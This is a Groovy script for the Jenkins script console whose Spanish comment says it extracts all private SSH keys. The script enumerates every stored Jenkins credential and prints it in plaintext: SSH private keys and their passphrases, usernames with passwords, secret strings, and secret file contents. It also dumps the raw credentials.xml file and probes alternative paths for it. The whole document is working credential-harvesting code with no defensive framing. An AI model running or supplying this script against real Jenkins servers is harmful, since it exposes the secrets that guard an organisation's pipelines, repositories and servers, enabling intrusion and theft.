// Extrae TODAS las SSH keys privadas via CredentialsProvider
import com.cloudbees.plugins.credentials.CredentialsProvider
import jenkins.model.Jenkins

def j = Jenkins.getInstance()

println "=== SSH PRIVATE KEYS ==="

// BasicSSHUserPrivateKey
try {
    def sshCreds = CredentialsProvider.lookupCredentials(
        com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey.class,
        j, null, null
    )
    println "SSH Key creds found: ${sshCreds.size()}"
    sshCreds.each { c ->
        println "=" * 60
        println "ID: ${c.id}"
        println "Desc: ${c.description}"
        println "User: ${c.username}"
        println "Key source: ${c.privateKeySource?.class?.simpleName}"
        try {
            println "Private Key:\n${c.privateKey}"
        } catch(e) {
            println "ERROR getting key: ${e.message}"
        }
        try {
            println "Passphrase: ${c.passphrase?.getPlainText()}"
        } catch(e) {
            println "No passphrase"
        }
    }
} catch(e) {
    println "SSH creds error: ${e.message}"
}

println "\n=== ALL CREDENTIALS (any type) ==="
try {
    def allCreds = CredentialsProvider.lookupCredentials(
        com.cloudbees.plugins.credentials.Credentials.class,
        j, null, null
    )
    println "Total creds: ${allCreds.size()}"
    allCreds.each { c ->
        def type = c.class.simpleName
        println "---"
        println "ID: ${c.id} | Type: ${type} | Desc: ${c.description}"
        // SSH keys
        if (c instanceof com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey) {
            println "  [SSH] User: ${c.username}"
            println "  [SSH] Key:\n${c.privateKey}"
        }
        // User/Pass
        if (c instanceof com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl) {
            println "  [UP] User: ${c.username} | Pass: ${c.password?.getPlainText()}"
        }
        // Secret string
        if (c instanceof org.jenkinsci.plugins.plaincredentials.impl.StringCredentialsImpl) {
            println "  [STR] Secret: ${c.secret?.getPlainText()}"
        }
        // Secret file
        if (c instanceof org.jenkinsci.plugins.plaincredentials.impl.FileCredentialsImpl) {
            println "  [FILE] FileName: ${c.fileName}"
            def content = c.content ? new String(c.content.bytes) : "N/A"
            println "  [FILE] Content: ${content.take(500)}"
        }
    }
} catch(e) {
    println "All creds error: ${e.message}"
}

println "\n=== CREDENTIALS.XML RAW DUMP ==="
def credsFile = new File("/var/jenkins_home/credentials.xml")
if (credsFile.exists()) {
    println credsFile.text
} else {
    println "credentials.xml NOT FOUND at /var/jenkins_home/credentials.xml"
    // Try other locations
    ["credentials.xml", "secrets/credentials.xml"].each { p ->
        def f = new File("/var/jenkins_home/${p}")
        println "Checking /var/jenkins_home/${p}: ${f.exists()}"
    }
}
